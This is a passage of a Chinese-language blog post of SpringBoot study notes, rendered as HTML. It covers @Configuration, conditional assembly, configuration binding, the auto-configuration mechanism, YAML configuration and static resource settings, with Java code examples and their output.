href="#自动装配原理" class="headerlink" title="自动装配原理"></a>自动装配原理</h1><h2 id="容器功能"><a href="#容器功能" class="headerlink" title="容器功能"></a>容器功能</h2><h3 id="组件添加"><a href="#组件添加" class="headerlink" title="组件添加"></a>组件添加</h3><p><strong>@Configuration</strong></p><p>通过 @Configuration来自定义组件 ，他默认的ID 为方法名： user01、tomcatPet</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyConfig</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> User <span class="title function_">user01</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&quot;Sentiment&quot;</span>, <span class="number">18</span>);</span><br><span class="line">        user.setPet(tomcatPet());</span><br><span class="line">        <span class="keyword">return</span> user;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> Pet <span class="title function_">tomcatPet</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Pet</span>(<span class="string">&quot;tomcat&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>测试</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//1、从容器中获取组件为单实例的</span></span><br><span class="line"><span class="type">Pet</span> <span class="variable">tomcat01</span> <span class="operator">=</span> run.getBean(<span class="string">&quot;tomcatPet&quot;</span>, Pet.class);</span><br><span class="line"><span class="type">Pet</span> <span class="variable">tomcat02</span> <span class="operator">=</span> run.getBean(<span class="string">&quot;tomcatPet&quot;</span>, Pet.class);</span><br><span class="line">System.out.println(<span class="string">&quot;组件：&quot;</span>+(tomcat01==tomcat02));</span><br><span class="line"><span class="comment">//true</span></span><br><span class="line"></span><br><span class="line"><span class="type">MyConfig</span> <span class="variable">bean</span> <span class="operator">=</span> run.getBean(MyConfig.class);</span><br><span class="line">System.out.println(bean);</span><br><span class="line"></span><br><span class="line"><span class="comment">//2、如果@Configuration(proxyBeanMethods = true)代理对象调用方法。SpringBoot总会检查这个组件是否在容器中有。</span></span><br><span class="line"><span class="comment">//保持组件单实例</span></span><br><span class="line"><span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> bean.user01();</span><br><span class="line"><span class="type">User</span> <span class="variable">user1</span> <span class="operator">=</span> bean.user01();</span><br><span class="line">System.out.println(user == user1);</span><br><span class="line"><span class="comment">//TRUE</span></span><br><span class="line"></span><br><span class="line"><span class="type">User</span> <span class="variable">user01</span> <span class="operator">=</span> run.getBean(<span class="string">&quot;user01&quot;</span>, User.class);</span><br><span class="line"><span class="type">Pet</span> <span class="variable">tom</span> <span class="operator">=</span> run.getBean(<span class="string">&quot;tomcatPet&quot;</span>, Pet.class);</span><br><span class="line"></span><br><span class="line">System.out.println(<span class="string">&quot;用户的宠物：&quot;</span>+(user01.getPet() == tom));</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>结果：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">组件：<span class="literal">true</span></span><br><span class="line">com.sentiment.boot.config.MyConfig$$EnhancerBySpringCGLIB$$809ee907@6bfdb014</span><br><span class="line"><span class="literal">true</span></span><br><span class="line">用户的宠物：<span class="literal">true</span> <span class="comment">//用户的宠物就是容器中的宠物</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>当@Configuration(proxyBeanMethods &#x3D; false)时，结果为：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">组件：<span class="literal">true</span></span><br><span class="line">com.sentiment.boot.config.MyConfig@408613cc</span><br><span class="line"><span class="literal">false</span></span><br><span class="line">用户的宠物：<span class="literal">false</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这是由于proxyBeanMethods的默认值为true,但当值为true时SpringBoot总会检查这个组件是否在容器中有，因此两个bean对象都是从容器中获取的所以相等</p><p>而设为false时，就不会从容器中检查，因此相当于创建了两个实例</p><p><strong>@Bean、@Component、@Controller、@Service、@Repository</strong></p><p>和mvc 一致</p><p><strong>@Import</strong></p><p>在MyConfig上加上@Import</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@Import(User.class)</span><br></pre></td></tr></table></figure><p>给容器中自动创建出这两个类型的组件 </p><p>这样在加载bean时除了前边加载的user01外，还会加载User</p><p><strong>@Conditionnal</strong><br>条件装配：满足Conditional指定的条件，则进行组件注册</p><p><img src="/2023/06/26/SpringBoot%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2.png"></p><p>以@ConditionalOnBean为例，当组件中有对应的bean时，则会进行组件注册</p><p>此时我们的 myconfig 中有两个bean ：user01、tomcat，但我们的条件设置为当有tomcatPet组件时才会进行组件注册</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@ConditionalOnBean(name=&quot;tomcatPet&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyConfig</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> User <span class="title function_">user01</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&quot;Sentiment&quot;</span>, <span class="number">18</span>);</span><br><span class="line">        user.setPet(tomcatPet());</span><br><span class="line">        <span class="keyword">return</span> user;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean(&quot;tomcat&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Pet</span> <span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Pet</span>(<span class="string">&quot;tomcat&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>由于两个bean中不包含tomcatPet，因此默认不会进行注入，</p><p>测试代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@SpringBootApplication</span>  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SpringBApplication</span> &#123;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        <span class="type">ConfigurableApplicationContext</span> <span class="variable">run</span> <span class="operator">=</span> SpringApplication.run(SpringBApplication.class, args);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">boolean</span> <span class="variable">tomcat</span> <span class="operator">=</span> run.containsBean(<span class="string">&quot;tomcat&quot;</span>);  </span><br><span class="line">        System.out.println(<span class="string">&quot;容器中tomcat组件：&quot;</span>+tomcat);  </span><br><span class="line">        <span class="type">boolean</span> <span class="variable">user01</span> <span class="operator">=</span> run.containsBean(<span class="string">&quot;user01&quot;</span>);  </span><br><span class="line">        System.out.println(<span class="string">&quot;容器中user01组件：&quot;</span>+user01);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>结果：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">容器中tomcat组件：<span class="literal">false</span></span><br><span class="line">容器中user01组件：<span class="literal">false</span></span><br></pre></td></tr></table></figure><p>而当@ConditionalOnBean改为@ConditionalOnMissingBean，即：当存在tomcatPet时注入，改为不存在时注入，结果：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">容器中tomcat组件：<span class="literal">true</span></span><br><span class="line">容器中user01组件：<span class="literal">true</span></span><br></pre></td></tr></table></figure><p>其作用是 如果没有 tomcatPet 组件时，自动帮我们装配  user01 和 tomcatPet 组件 </p><h3 id="原生配置文件引入"><a href="#原生配置文件引入" class="headerlink" title="原生配置文件引入"></a>原生配置文件引入</h3><p><strong>@ImportResource</strong></p><p>假设在<a href="https://so.csdn.net/so/search?q=Spring%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6&spm=1001.2101.3001.7020">Spring配置文件</a>中设置了依赖注入，SpringBoot并不会识别Spring的配置文件，这就需要@ImportResource注解进行初始化，用作于导入外来组件。</p><h3 id="配置绑定"><a href="#配置绑定" class="headerlink" title="配置绑定"></a>配置绑定</h3><p>读取  properties 文件中的内容，并且 封装到JavaBean 中，以供随时修改使用</p><p>定义一个Car类，设置properties前缀为mycar</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="meta">@ConfigurationProperties(prefix =&quot;mycar&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Car</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String brand;</span><br><span class="line">    <span class="keyword">private</span> Integer price;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getBrand</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> brand;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setBrand</span><span class="params">(String brand)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.brand = brand;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Integer <span class="title function_">getPrice</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> price;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setPrice</span><span class="params">(Integer price)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.price = price;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Car&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;brand=&#x27;&quot;</span> + brand + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, price=&quot;</span> + price +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>接着再properties文件设置，前缀为mycar的赋值参数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mycar.brand=BYD</span><br><span class="line">mycar.price=<span class="number">10000</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>写个控制器直接获取car类中属性的值</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Autowired</span></span><br><span class="line">Car car;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/car&quot;)</span></span><br><span class="line"><span class="keyword">public</span> Car <span class="title function_">car</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> car;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>访问&#x2F;car路径，成功初始化属性</p><p><img src="/2023/06/26/SpringBoot%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/3.jpg"></p><h3 id="自动装配原理-1"><a href="#自动装配原理-1" class="headerlink" title="自动装配原理"></a>自动装配原理</h3><p><a href="https://www.yuque.com/atguigu/springboot/qb7hy2#UJZFM">https://www.yuque.com/atguigu/springboot/qb7hy2#UJZFM</a></p><p>跟进主函数的 @SpringBootApplication</p><p>发现有挺多组件的：<br><img src="/2023/06/26/SpringBoot%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/4.png"></p><p><strong>@SpringBootConfiguration</strong><br>其含义是代表当前是个配置类</p><p><strong>@ComponentScan</strong><br>其含义是指定扫描哪些</p><p><strong>@EnableAutoConfiguration</strong> (重点)</p><p>跟进EnableAutoConfiguration </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@AutoConfigurationPackage</span>  </span><br><span class="line"><span class="meta">@Import(&#123;AutoConfigurationImportSelector.class&#125;)</span></span><br></pre></td></tr></table></figure><p><strong>@AutoConfigurationPackage</strong><br>自动配置包</p><p><img src="/2023/06/26/SpringBoot%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/5.jpg"></p><p>跟进Import 中的 Registrar.class</p><p><img src="/2023/06/26/SpringBoot%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/6.png"><br>跟容器中 导入一系列组件</p><p>将指定的一个包下的所有组件导入进来，也就是MainApplication 所在包下</p><p>返回到 @EnableAutoConfiguration 组件中，看看他导入了什么：</p><p><img src="/2023/06/26/SpringBoot%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/7.png"></p><p>@Import({AutoConfigurationImportSelector.class})</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>、利用getAutoConfigurationEntry(annotationMetadata);给容器中批量导入一些组件</span><br><span class="line"></span><br><span class="line"><span class="number">2</span>、调用List&lt;String&gt; configurations = getCandidateConfigurations(annotationMetadata, attributes)获取到所有需要导入到容器中的配置类</span><br><span class="line"></span><br><span class="line"><span class="number">3</span>、利用工厂加载 Map&lt;String, List&lt;String&gt;&gt; <span class="title function_">loadSpringFactories</span><span class="params">(<span class="meta">@Nullable</span> ClassLoader classLoader)</span>；得到所有的组件</span><br><span class="line"></span><br><span class="line"><span class="number">4</span>、从META-INF/spring.factories位置来加载一个文件。</span><br><span class="line">默认扫描我们当前系统里面所有META-INF/spring.factories位置的文件</span><br><span class="line">    spring-boot-autoconfigure-<span class="number">2.3</span><span class="number">.4</span>.RELEASE.jar包里面也有META-INF/spring.factories</span><br></pre></td></tr></table></figure><p>也就是说 在springboot 启动时，会自动加载其组件，但是也不会全部都加载，会实现按照条件装配规则（@Conditional），最终会按需配置。</p><h1 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h1><p>用 Yaml 格式，数据类型以键值对</p><ul><li>对象：键值对的集合。map、hash、set、object</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">k: &#123;k1: v1,k2: v2,k3: v3&#125;</span><br><span class="line">或</span><br><span class="line">k:</span><br><span class="line">  k1: v1</span><br><span class="line">  k2: v2</span><br><span class="line">  k3: v3</span><br></pre></td></tr></table></figure><ul><li>数组：一组按次序排列的值。array、list、queue</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">k: [v1,v2,v3]</span><br><span class="line">k:</span><br><span class="line">  - v1</span><br><span class="line">  - v2</span><br><span class="line">  - v3</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><p>Person</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@ConfigurationProperties(&quot;person&quot;)</span></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="meta">@ToString</span></span><br><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String userName;</span><br><span class="line">    <span class="keyword">private</span> Boolean boss;</span><br><span class="line">    <span class="keyword">private</span> Date birth;</span><br><span class="line">    <span class="keyword">private</span> Integer age;</span><br><span class="line">    <span class="keyword">private</span> Pet pet;</span><br><span class="line">    <span class="keyword">private</span> String[] interests;</span><br><span class="line">    <span class="keyword">private</span> List&lt;String&gt; animal;</span><br><span class="line">    <span class="keyword">private</span> Map&lt;String, Object&gt; score;</span><br><span class="line">    <span class="keyword">private</span> Set&lt;Double&gt; salarys;</span><br><span class="line">    <span class="keyword">private</span> Map&lt;String, List&lt;Pet&gt;&gt; allPets;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Pet</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@ToString</span></span><br><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Pet</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> Double weight;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>配置文件<strong>application.yaml</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">person:</span><br><span class="line">  userName: ku1s</span><br><span class="line">  boss: <span class="literal">false</span></span><br><span class="line">  birth: <span class="number">2001</span>/<span class="number">12</span>/<span class="number">7</span></span><br><span class="line">  age: <span class="number">20</span></span><br><span class="line">#  interests: [唱,跳,rap]</span><br><span class="line">  interests:</span><br><span class="line">    - 唱歌</span><br><span class="line">    - 跳</span><br><span class="line">    - rap</span><br><span class="line">#  animal: [猫,狗]</span><br><span class="line">  animal:</span><br><span class="line">    - 猫</span><br><span class="line">    - 狗</span><br><span class="line">#  score: &#123;english: <span class="number">80</span>,math: <span class="number">90</span>&#125;</span><br><span class="line">  score:</span><br><span class="line">    english: <span class="number">80</span></span><br><span class="line">    math: <span class="number">90</span></span><br><span class="line">  salarys:</span><br><span class="line">    - <span class="number">99.9</span></span><br><span class="line">    - <span class="number">999.9</span></span><br><span class="line">  pet:</span><br><span class="line">    name: 猫</span><br><span class="line">    weight: <span class="number">90</span></span><br><span class="line">  allPets:</span><br><span class="line">    sick:</span><br><span class="line">      - name: 猫</span><br><span class="line">        weight: <span class="number">90</span></span><br><span class="line">      - &#123;name: 狗,weight: <span class="number">80</span>&#125;</span><br><span class="line">    health:</span><br><span class="line">      - &#123;name: 鱼,weight: <span class="number">20</span>&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/2023/06/26/SpringBoot%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/8.png"></p><p>结果：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;userName&quot;</span>:<span class="string">&quot;ku1s&quot;</span>,<span class="string">&quot;boss&quot;</span>:<span class="literal">false</span>,<span class="string">&quot;birth&quot;</span>:<span class="string">&quot;2001-12-06T16:00:00.000+00:00&quot;</span>,<span class="string">&quot;age&quot;</span>:<span class="number">20</span>,<span class="string">&quot;pet&quot;</span>:&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;猫&quot;</span>,<span class="string">&quot;weight&quot;</span>:<span class="number">90.0</span>&#125;,<span class="string">&quot;interests&quot;</span>:[<span class="string">&quot;唱歌&quot;</span>,<span class="string">&quot;跳&quot;</span>,<span class="string">&quot;rap&quot;</span>],<span class="string">&quot;animal&quot;</span>:[<span class="string">&quot;猫&quot;</span>,<span class="string">&quot;狗&quot;</span>],<span class="string">&quot;score&quot;</span>:&#123;<span class="string">&quot;english&quot;</span>:<span class="number">80</span>,<span class="string">&quot;math&quot;</span>:<span class="number">90</span>&#125;,<span class="string">&quot;salarys&quot;</span>:[<span class="number">99.9</span>,<span class="number">999.9</span>],<span class="string">&quot;allPets&quot;</span>:&#123;<span class="string">&quot;sick&quot;</span>:[&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;猫&quot;</span>,<span class="string">&quot;weight&quot;</span>:<span class="number">90.0</span>&#125;,&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;狗&quot;</span>,<span class="string">&quot;weight&quot;</span>:<span class="number">80.0</span>&#125;],<span class="string">&quot;health&quot;</span>:[&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;鱼&quot;</span>,<span class="string">&quot;weight&quot;</span>:<span class="number">20.0</span>&#125;]&#125;&#125;</span><br></pre></td></tr></table></figure><h1 id="Web开发"><a href="#Web开发" class="headerlink" title="Web开发"></a>Web开发</h1><h2 id="静态资源访问"><a href="#静态资源访问" class="headerlink" title="静态资源访问"></a>静态资源访问</h2><h2 id="静态资源访问-1"><a href="#静态资源访问-1" class="headerlink" title="静态资源访问"></a>静态资源访问</h2><p>静态资源默认存放在<code>/static</code>、<code>/public</code>、<code>META-INF/resources</code>、<code>/resources</code>，默认静态映射路径为&#x2F;**</p><p><strong>原理</strong><br>请求进来，先去找Controller看能不能处理。不能处理的所有请求又都交给静态资源处理器。静态资源也找不到则响应404页面</p><p>因此请求顺序为：Controller —&gt; 静态资源 —&gt;404</p><h2 id="修改静态资源设置"><a href="#修改静态资源设置" class="headerlink" title="修改静态资源设置"></a><strong>修改静态资源设置</strong></h2><p>1、匹配静态资源的URL路径模式。即请求路径中带有&#x2F;res才会被当做静态资源处理</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">spring:</span><br><span class="line">  mvc:</span><br><span class="line">    <span class="keyword">static</span>-path-pattern: /res<span class="comment">/**</span></span><br></pre></td></tr></table></figure><p>2、修改静态资源位置</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">spring:</span><br><span class="line">    resources:</span><br><span class="line">      <span class="keyword">static</span>-locations: classpath:/test</span><br><span class="line">#      可用数组形式</span><br><span class="line">#      <span class="keyword">static</span>-locations: [classpath:/test,/demo]</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="欢迎页支持"><a href="#欢迎页支持" class="headerlink" title="欢迎页支持:"></a><strong>欢迎页支持:</strong></h2><p>默认欢迎页有两种：</p><ul><li>静态资源(static)路径下的 index.html</li><li>controller处理的&#x2F;index请求<br>需注意不要设置访问前缀，否则会加载不到</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">spring:</span><br><span class="line">#  mvc:</span><br><span class="line">#    <span class="keyword">static</span>-path-pattern: /res<span class="comment">/**         这个会导致welcome page功能失效</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  resources:</span></span><br><span class="line"><span class="comment">    static-locations: classpath:/test</span></span><br><span class="line"><span class="comment"></span></span><br></pre></td></tr></table></figure><h2 id="自定义Favicon"><a href="#自定义Favicon" class="headerlink" title="自定义Favicon"></a><strong>自定义Favicon</strong></h2><p>favicon.ico 放在静态资源目录下即可，但同样不要设置访问前缀</p><h2 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h2><ul><li>SpringBoot启动默认加载 xxxAutoConfiguration 类（自动配置类）</li><li>SpringMVC功能的自动配置类 WebMvcAutoConfiguration，生效</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Configuration(proxyBeanMethods = false)</span></span><br><span class="line"><span class="meta">@ConditionalOnWebApplication(type = Type.SERVLET)</span></span><br><span class="line"><span class="meta">@ConditionalOnClass(&#123; Servlet.class, DispatcherServlet.class, WebMvcConfigurer.class &#125;)</span></span><br><span class="line"><span class="meta">@ConditionalOnMissingBean(WebMvcConfigurationSupport.class)</span></span><br><span class="line"><span class="meta">@AutoConfigureOrder(Ordered.HIGHEST_PRECEDENCE + 10)</span></span><br><span class="line"><span class="meta">@AutoConfigureAfter(&#123; DispatcherServletAutoConfiguration.class, TaskExecutionAutoConfiguration.class,</span></span><br><span class="line"><span class="meta">ValidationAutoConfiguration.class &#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">WebMvcAutoConfiguration</span> &#123;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>往下看给容器配置了什么，找到了WebMvcAutoConfigurationAdapter资源适配器</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Configuration(proxyBeanMethods = false)</span></span><br><span class="line"><span 